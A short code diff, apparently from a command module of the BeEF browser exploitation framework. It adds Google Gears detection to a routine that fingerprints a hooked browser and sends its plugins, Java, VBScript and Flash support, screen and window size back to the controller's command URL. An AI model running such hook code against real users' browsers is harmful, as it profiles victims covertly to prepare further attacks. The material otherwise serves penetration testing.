@@ -55,7 +55,8 @@ function serialize(_obj)
     var java_enabled = (beef.browser.hasJava())? "Yes" : "No";
     var vbscript_enabled = (beef.browser.hasVBScript())? "Yes" : "No";
     var has_flash = (beef.browser.hasFlash())? "Yes" : "No";
+    var has_googlegears = (beef.browser.hasGoogleGears())? "Yes" : "No";
     var screen_params = serialize(beef.browser.getScreenParams());
     var window_size = serialize(beef.browser.getWindowSize());
-    beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'plugins='+plugins+'&java_enabled='+java_enabled+'&vbscript_enabled='+vbscript_enabled+'&has_flash='+has_flash+'&browser_type='+browser_type+'&screen_params='+screen_params+'&window_size='+window_size);
+    beef.net.sendback('<%= @command_url %>', <%= @command_id %>, 'plugins='+plugins+'&java_enabled='+java_enabled+'&vbscript_enabled='+vbscript_enabled+'&has_flash='+has_flash+'&has_googlegears='+has_googlegears+'&browser_type='+browser_type+'&screen_params='+screen_params+'&window_size='+window_size);
 });
